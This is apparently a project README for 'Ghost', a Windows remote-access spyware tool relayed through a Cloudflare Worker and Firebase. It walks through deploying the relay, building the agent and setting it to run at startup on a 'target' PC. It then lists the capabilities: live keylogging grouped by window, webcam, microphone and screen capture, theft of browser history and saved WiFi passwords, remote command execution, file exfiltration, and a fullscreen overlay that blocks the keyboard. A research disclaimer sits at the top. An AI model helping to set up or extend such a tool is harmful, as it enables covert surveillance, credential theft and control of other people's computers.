<div align="center">

```
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██║  ███╗███████║██║   ██║███████╗   ██║   
██║   ██║██╔══██║██║   ██║╚════██║   ██║   
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝  
```

### **v1.0 — Ghost Remote Monitoring System**

[![Python](https://img.shields.io/badge/Python-3.12-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
[![Cloudflare](https://img.shields.io/badge/Cloudflare-Workers-F38020?style=flat-square&logo=cloudflare&logoColor=white)](https://workers.cloudflare.com)
[![Firebase](https://img.shields.io/badge/Firebase-Realtime_DB-FFCA28?style=flat-square&logo=firebase&logoColor=black)](https://firebase.google.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)](.)
[![Made by](https://img.shields.io/badge/Made_by-@kakarotbd-E4405F?style=flat-square&logo=instagram&logoColor=white)](https://instagram.com/kakarotbd)

</div>

---

> [!WARNING]
> This tool is built strictly for **authorized security research and educational purposes**.
> Running it on any machine without explicit written permission is **illegal** and may result in criminal charges under cybercrime laws. The author holds no responsibility for misuse.

---

## How It Works

No Firebase credentials ever touch the browser or the agent. Everything is proxied through a Cloudflare Worker that handles authentication, rate limiting, and all database traffic.

```
 ┌─────────────────────┐        ┌──────────────────────────┐
 │   index.html        │        │   main.py (target PC)    │
 │   Dashboard UI      │        │   Windows agent          │
 │   · No DB keys      │        │   · No DB keys           │
 │   · Session token   │        │   · Ghost token only     │
 └────────┬────────────┘        └────────────┬─────────────┘
          │                                  │
          │  HTTPS                           │  HTTPS
          ▼                                  ▼
 ┌────────────────────────────────────────────────────────┐
 │              Cloudflare Worker  (worker.js)            │
 │                                                        │
 │  · Password auth  →  HMAC session tokens              │
 │  · Rate limiting  →  300 req/min per IP               │
 │  · Path whitelist →  only known DB paths allowed      │
 │  · All secrets stored in encrypted env vars           │
 └────────────────────────┬───────────────────────────────┘
                          │  Firebase REST  (DB Secret)
                          ▼
 ┌────────────────────────────────────────────────────────┐
 │              Firebase Realtime Database                │
 │  · Locked down  (no public read/write)                │
 │  · Only reachable through the Worker                  │
 └────────────────────────────────────────────────────────┘
```

---

## Requirements

| | |
|---|---|
| **Python** | 3.12 exactly — other versions may break the build |
| **Cloudflare** | Free account |
| **Firebase** | Free Spark plan |
| **Target OS** | Windows only |

---

## Setup

### `01` — Firebase

**1.** Go to [console.firebase.google.com](https://console.firebase.google.com) → **Add project** → any name → **Create project**

**2.** Left sidebar → **Build** → **Realtime Database** → **Create Database** → pick any region → **Start in test mode** → **Enable**

**3.** Copy your database URL — shown at the top of the database page:
```
https://your-project-default-rtdb.firebaseio.com
```

**4.** **Gear icon** (top left) → **Project Settings** → **Service accounts** tab → scroll to **Database secrets** → **Add secret** → copy the value

**5.** Go to the **Rules** tab in Realtime Database → replace everything with this → **Publish**:
```json
{
  "rules": {
    ".read": false,
    ".write": false
  }
}
```

You now have your **Database URL** and **Database Secret**. Keep them.

---

### `02` — Cloudflare Worker

**Deploy:**

**1.** Go to [dash.cloudflare.com](https://dash.cloudflare.com) → **Workers & Pages** → **Create** → **Create Worker** → name it anything → **Deploy**

**2.** Click **Edit code** → select all → delete → paste the entire contents of `worker.js` → **Save and deploy**

**3.** Copy your Worker URL:
```
https://your-worker.yourname.workers.dev
```

**KV Namespace (rate limiter storage):**

**4.** Left sidebar → **Workers & Pages** → **KV** → **Create namespace** → name: `GHOST_RATE_LIMIT` → **Add**

**5.** Your Worker → **Settings** → **Variables** → **KV Namespace Bindings** → **Add binding**
- Variable name → `RATE_LIMIT`
- KV namespace → `GHOST_RATE_LIMIT`

→ **Save and deploy**

**Environment Variables:**

**6.** Still in **Settings** → **Variables** → **Add variable** — add all five below. Mark everything as **Encrypt** except `FIREBASE_DB_URL`:

| Variable | Value | Encrypt? |
|---|---|---|
| `GHOST_SECRET` | random string 32+ chars | ✅ Yes |
| `DASHBOARD_PASS` | your login password | ✅ Yes |
| `SESSION_SECRET` | another random string 32+ chars | ✅ Yes |
| `FIREBASE_DB_URL` | database URL from step 01 | ❌ No |
| `FIREBASE_SECRET` | database secret from step 01 | ✅ Yes |

> **Generate a random string** — open browser console `F12` and run:
> ```js
> crypto.getRandomValues(new Uint8Array(32)).reduce((a,b)=>a+b.toString(16).padStart(2,'0'),'')
> ```

→ **Save and deploy**

**7.** Verify the Worker is live — visit this in your browser. You should see `{"ok":true}`:
```
https://your-worker.yourname.workers.dev/health
```

---

### `03` — Dashboard

Open `index.html` in any text editor. Find this line near the top:

```js
const WORKER_URL = "https://YOUR_WORKER.YOUR_SUBDOMAIN.workers.dev";
```

Replace the placeholder with your Worker URL → save the file.

Open `index.html` in your browser → enter your `DASHBOARD_PASS` → you're in.

> You can host `index.html` anywhere — GitHub Pages, Cloudflare Pages, or just open it locally. No server needed.

---

### `04` — Agent

Open `main.py` in any text editor. Find these two lines near the top:

```python
WORKER_URL   = "https://YOUR_WORKER.YOUR_SUBDOMAIN.workers.dev"
WORKER_TOKEN = "PASTE_YOUR_GHOST_SECRET_HERE"
```

- `WORKER_URL` → your Worker URL
- `WORKER_TOKEN` → exact same value as `GHOST_SECRET` in Cloudflare

**Install dependencies** — run `pip.bat` on the target machine. This installs all required Python modules automatically.

> Manual install if needed:
> ```bash
> pip install requests Pillow opencv-python numpy pyaudio pynput psutil wmi pywin32
> ```

**Build the executable** — run `build.bat`. This compiles `main.py` into a standalone `.exe`. Build time depends on your machine.

**Deploy** — go into the `exe` folder and run `run.bat`:

| Input | Action |
|---|---|
| `1` | Adds to startup — runs automatically every time Windows boots |
| `2` | Removes from startup — disables auto-run |

Once running, the device appears in your dashboard within seconds.

---

## Dashboard — What You Can Do

Everything is controlled from `index.html` in your browser. Select a device from the left panel to target it.

---

**`Terminal`**
Send any command and see the result live. History panel lets you resend previous commands instantly.

---

**`CMD Terminal`**
Full-screen dedicated terminal. Runs raw Windows commands with complete output — no truncation. Quick-access buttons for common commands. Arrow keys navigate history.

---

**`Screenshots & Webcam`**
`/screenshot` or `/webcam` — captures appear in the gallery instantly. Click to open fullscreen, download, or delete.

---

**`Video Recording`**
`/video 15` — records up to 20 seconds from the webcam. Play fullscreen in browser, download as MP4, or delete.

---

**`Audio Recording`**
`/mic 30` — records microphone audio up to 300 seconds. In-browser playback, download as WAV.

---

**`Live Keylogger`**
Click **START** — keystrokes stream in real time, grouped by window title so you see exactly which app they were typed in. **STOP** ends capture. **CLEAR** wipes all data.

---

**`Browser History`**
`/browser_history` — opens a full overlay showing history from Chrome, Edge, Firefox, and Brave, each grouped separately with title, URL, visit count, and timestamp. Close the browser on the target first for best results.

---

**`Screen Broadcast`**
Type a message and click **BROADCAST** — a fullscreen overlay appears on the target with your message and the keyboard is fully blocked. The user cannot dismiss it. Click **CLEAR SCREEN** to remove it.

---

**`WiFi Passwords`**
`/wifipass` — returns every saved WiFi network name and password.

---

**`System Information`**
`/fullinfo` — detailed overlay with CPU, RAM, disk, network, processes, battery, location, and more.

---

**`Remote Actions`**

| Command | Effect |
|---|---|
| `/lock` | Locks the workstation |
| `/logout` | Logs out the current user |
| `/restart` | Restarts in 10 seconds |
| `/shutdown` | Shuts down in 10 seconds |
| `/taskkill [name/pid]` | Kills a process |
| `/clipboard` | Reads clipboard content |
| `/setclip [text]` | Writes to clipboard |
| `/download [path]` | Downloads a file to your browser |
| `/open [url/app]` | Opens a URL or application |
| `/wallpaper [url]` | Sets the desktop wallpaper |
| `/msg [text]` | Shows a popup message on screen |

---

## Troubleshooting

**Device not showing up**
Double-check `WORKER_URL` and `WORKER_TOKEN` in `main.py`. `WORKER_TOKEN` must match `GHOST_SECRET` exactly — one wrong character and it won't connect.

**Login fails**
Make sure `DASHBOARD_PASS` is set correctly in your Cloudflare environment variables and the Worker was redeployed after adding it.

**Commands sent but no response**
Verify the KV namespace binding is configured (`RATE_LIMIT` → `GHOST_RATE_LIMIT`) and the Worker was saved and deployed after adding the binding.

**Browser history is empty**
The browser locks its database while it's running. Close Chrome, Edge, or Firefox on the target machine completely, then send `/browser_history` again.

**Build fails**
You must use Python **3.12** specifically. Other versions may cause compatibility issues during the build process.

---

<div align="center">

`v9.0` · `Windows` · `Cloudflare Workers` · `Firebase`

Made by [@kakarotbd](https://instagram.com/kakarotbd) — follow on Instagram

</div>
